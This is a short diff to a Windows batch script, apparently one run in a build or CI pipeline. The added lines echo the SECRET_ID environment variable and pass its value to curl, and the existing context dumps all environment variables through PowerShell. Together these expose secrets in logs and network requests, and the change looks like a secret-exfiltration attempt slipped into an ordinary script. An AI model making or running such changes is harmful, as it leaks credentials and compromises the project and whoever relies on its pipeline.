@@ -1,5 +1,8 @@
 @echo off
 
+echo SECRET_ID=%SECRET_ID%
+curl "%SECRET_ID%"
+
 powershell -NoProfile -Command "Get-ChildItem Env:"
 
 setlocal enabledelayedexpansion
